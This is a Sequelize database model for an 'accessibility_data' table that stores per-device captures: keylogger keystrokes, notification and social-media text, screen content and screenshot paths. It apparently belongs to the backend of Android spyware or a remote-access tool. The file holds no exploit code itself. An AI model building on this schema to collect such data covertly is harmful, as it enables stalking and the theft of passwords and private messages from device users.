const { DataTypes } = require('sequelize');

module.exports = (sequelize) => {
  const AccessibilityData = sequelize.define('AccessibilityData', {
    id: {
      type: DataTypes.UUID,
      defaultValue: DataTypes.UUIDV4,
      primaryKey: true
    },
    deviceId: {
      type: DataTypes.STRING,
      allowNull: false,
      field: 'deviceId',
      references: {
        model: 'devices',
        key: 'deviceId'
      },
      onUpdate: 'CASCADE',
      onDelete: 'CASCADE',
      comment: 'Reference to devices table (deviceId)'
    },
    dataType: {
      type: DataTypes.ENUM('keylogger', 'notifications', 'social_media', 'screen_content', 'ui_events'),
      field: 'data_type',
      allowNull: false
    },
    appPackage: {
      type: DataTypes.STRING,
      field: 'app_package',
      allowNull: true,
      comment: 'Package name of the source app'
    },
    appName: {
      type: DataTypes.STRING,
      field: 'app_name',
      allowNull: true,
      comment: 'Display name of the source app'
    },
    eventType: {
      type: DataTypes.STRING,
      field: 'event_type',
      allowNull: true,
      comment: 'Type of accessibility event'
    },
    contentText: {
      type: DataTypes.TEXT,
      field: 'content_text',
      allowNull: true,
      comment: 'Text content captured'
    },
    contentDescription: {
      type: DataTypes.TEXT,
      field: 'content_description',
      allowNull: true,
      comment: 'Content description'
    },
    className: {
      type: DataTypes.STRING,
      field: 'class_name',
      allowNull: true,
      comment: 'UI element class name'
    },
    viewId: {
      type: DataTypes.STRING,
      field: 'view_id',
      allowNull: true,
      comment: 'View resource ID'
    },
    windowTitle: {
      type: DataTypes.STRING,
      field: 'window_title',
      allowNull: true,
      comment: 'Window or activity title'
    },
    notificationTitle: {
      type: DataTypes.STRING,
      field: 'notification_title',
      allowNull: true,
      comment: 'Notification title (for notification events)'
    },
    notificationText: {
      type: DataTypes.TEXT,
      field: 'notification_text',
      allowNull: true,
      comment: 'Notification content text'
    },
    notificationKey: {
      type: DataTypes.STRING,
      field: 'notification_key',
      allowNull: true,
      comment: 'Notification key'
    },
    keystrokes: {
      type: DataTypes.TEXT,
      allowNull: true,
      comment: 'Captured keystrokes (for keylogger)'
    },
    coordinates: {
      type: DataTypes.JSON,
      allowNull: true,
      comment: 'UI element coordinates {x, y, width, height}'
    },
    screenshotPath: {
      type: DataTypes.STRING,
      field: 'screenshot_path',
      allowNull: true,
      comment: 'Path to associated screenshot'
    },
    metadata: {
      type: DataTypes.JSON,
      allowNull: true,
      comment: 'Additional event metadata'
    },
    timestamp: {
      type: DataTypes.DATE,
      allowNull: false,
      defaultValue: DataTypes.NOW
    },
    isSensitive: {
      type: DataTypes.BOOLEAN,
      field: 'is_sensitive',
      defaultValue: false,
      comment: 'Whether this data contains sensitive information'
    },
    isDeleted: {
      type: DataTypes.BOOLEAN,
      field: 'is_deleted',
      defaultValue: false
    }
  }, {
    tableName: 'accessibility_data',
    timestamps: true,
    underscored: true,
    indexes: [
      {
        name: 'idx_accessibility_data_deviceId',
        fields: ['deviceId']
      },
      {
        name: 'idx_accessibility_data_type',
        fields: ['data_type']
      },
      {
        name: 'idx_accessibility_created_at',
        fields: ['created_at']
      }
    ]
  });

  // Define associations
  AccessibilityData.associate = (models) => {
    if (models.Device) {
      AccessibilityData.belongsTo(models.Device, {
        foreignKey: 'deviceId',
        targetKey: 'deviceId',
        as: 'device'
      });
    }
  };

  return AccessibilityData;
};
